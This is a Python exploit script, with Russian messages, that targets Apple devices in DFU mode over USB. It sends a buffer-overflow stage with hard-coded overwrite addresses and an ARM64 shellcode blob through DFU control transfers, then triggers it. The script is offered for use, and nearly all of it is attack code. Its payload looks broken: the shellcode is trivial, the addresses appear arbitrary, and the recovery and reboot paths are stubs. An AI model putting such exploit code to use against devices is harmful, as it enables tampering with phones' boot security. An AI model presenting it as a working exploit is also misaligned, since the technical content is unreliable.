import usb.core
import usb.util
import time
from struct import pack
import os
import sys

APPLE_VID = 0x05AC
DFU_PID = 0x1227
RECOVERY_PID = 0x1281

class Yara1nExploit:
    def __init__(self):
        self.dev = None
        self.in_dfu = False
        self.in_recovery = False

    def find_device(self, pid=DFU_PID):
        dev = usb.core.find(idVendor=APPLE_VID, idProduct=pid)
        if not dev:
            return None
        return dev

    def wait_for_device(self, pid=DFU_PID):
        print("[*] Ожидание устройства...")
        while True:
            dev = self.find_device(pid)
            if dev:
                print(f"[+] Найдено устройство: {dev}")
                return dev
            time.sleep(0.5)

    def build_stage1(self):
        payload = b"A" * 0x1F0
        payload += pack("<Q", 0xFC023828)
        payload += pack("<Q", 0xFC00B000)
        payload += b"\x42" * 0x10
        return payload

    def build_stage2(self):
        shellcode = b"\x1F\x20\x03\xD5" * 8
        shellcode += b"\xE0\x03\x1F\xAA"
        shellcode += b"\x01\x00\x80\xD2"
        shellcode += b"\x02\x00\x80\xD2"
        shellcode += b"\x03\x00\x80\xD2"
        shellcode += b"\x00\x00\x00\xF9"
        return shellcode.ljust(0x200, b"\x00")

    def send_payload(self, payload: bytes, block=0):
        print(f"[>] Отправка payload ({len(payload)} байт, block={block})...")
        try:
            self.dev.ctrl_transfer(
                bmRequestType=0x21,
                bRequest=1,
                wValue=block,
                wIndex=0,
                data_or_wLength=payload,
                timeout=1000
            )
            print("[+] Payload отправлен")
            return True
        except usb.core.USBError as e:
            print(f"[!] Ошибка при отправке: {e}")
            return False

    def clear_status(self):
        try:
            self.dev.ctrl_transfer(0x21, 4, 0, 0, [], timeout=1000)
            print("[*] CLRSTATUS отправлен")
        except:
            pass

    def trigger(self):
        print("[>] Триггер...")
        try:
            resp = self.dev.ctrl_transfer(
                bmRequestType=0xA1,
                bRequest=3,
                wValue=0,
                wIndex=0,
                data_or_wLength=6,
                timeout=1000
            )
            print(f"[+] Ответ: {list(resp)}")
            return True
        except usb.core.USBError as e:
            print(f"[!] Ошибка при триггере: {e}")
            return False

    def enter_dfu(self):
        print("[*] Переход в DFU...")
        self.dev = self.wait_for_device()
        try:
            self.dev.set_configuration()
        except usb.core.USBError:
            pass

        time.sleep(0.5)
        payload1 = self.build_stage1()
        if not self.send_payload(payload1, block=0xFFFF):
            return False
        time.sleep(0.5)
        self.clear_status()
        
        time.sleep(0.5)
        payload2 = self.build_stage2()
        if not self.send_payload(payload2, block=1):
            return False
        time.sleep(0.5)
        
        return self.trigger()

    def enter_recovery(self):
        print("[*] Переход в Recovery...")
        if not self.in_dfu:
            if not self.enter_dfu():
                return False
        
        # Здесь будет код для перехода в Recovery
        # Пока просто заглушка
        print("[*] Recovery mode (заглушка)")
        return True

    def reboot(self):
        print("[*] Перезагрузка...")
        if not self.in_dfu and not self.in_recovery:
            if not self.enter_dfu():
                return False
        
        # Здесь будет код для перезагрузки
        # Пока просто заглушка
        print("[*] Reboot (заглушка)")
        return True

def main():
    exploit = Yara1nExploit()
    
    if len(sys.argv) < 2:
        print("Использование: python3 exploit.py [dfu|recovery|reboot]")
        return

    cmd = sys.argv[1].lower()
    if cmd == "dfu":
        exploit.enter_dfu()
    elif cmd == "recovery":
        exploit.enter_recovery()
    elif cmd == "reboot":
        exploit.reboot()
    else:
        print("Неизвестная команда")

if __name__ == "__main__":
    main() 